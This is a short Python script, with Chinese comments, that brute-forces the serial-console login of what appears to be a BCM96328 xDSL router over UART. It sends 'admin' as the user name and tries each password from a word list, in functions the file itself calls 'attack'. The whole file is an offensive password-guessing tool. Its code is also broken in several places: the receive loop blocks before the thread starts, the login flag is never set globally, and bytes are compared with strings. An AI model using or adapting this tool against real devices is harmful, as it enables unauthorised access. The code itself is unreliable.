# -*- coding: UTF-8 -*--
import serial
import time
import threading
#串口号
m_device = "/dev/ttyAMA0"
#波特率
m_baud_rate = "115200"
#需要发送任意按键中断
m_isInterrupt = False
#错误次数会造成等待
m_count = 3
#错误等待时间(单位：秒)
m_sleep_time = 1
#开启日志记录，开启后默认存在于当前目录下
m_isLog = False
#用户名提示输入：
m_username_input=""
m_login_signal = False
m_login_prompt = "Login:"
m_username = "admin"
m_last_line = "32768500 (0x1f401f4)"
def attack(uart,user_name,m_pwd):
    uart.write((user_name+"\r\n").encode(encoding="utf-8"))
    time.sleep(0.5)
    uart.write(m_pwd.encode(encoding="utf-8"))
    return
def uart_recevie(uart):
    rec_txt=""
    while True:
        rec_txt=uart.readline()
        print(rec_txt)
        if m_login_prompt in rec_txt:
            m_login_signal = True
        if m_last_line in rec_txt:
            uart.write(("\r\n".encode(encoding="utf-8")))
        if "BCM96328 xDSL Router" in rec_txt:
            uart.write(("admin").encode(encoding="utf-8"))
    return
def uart_send(uart,user_name,file_name):
    f = open(file_name)
    print("aaa")
    line = f.readline()
    while line:
        for i in range(0,m_count):
            print("Trying>>>" + line)
            attack(uart,user_name,line)
            line = f.readline()
            if not len(line):
                break
        time.sleep(m_sleep_time)
    f.close()
    return
if __name__== '__main__':
    m_uart = serial.Serial(m_device,m_baud_rate)
    uart_recevie(m_uart)
    t2= threading.Thread(target=uart_recevie, args=(m_uart,))
    t2.setDaemon(False)
    t2.start()
    while True:
        if m_login_signal:
            t1= threading.Thread(target=uart_send, args=(m_uart,m_username,"./psw.txt",))
            t1.start()
            break
    print(">>>>>>Begining to attack!<<<<<<")
    print("Username:"+m_username)
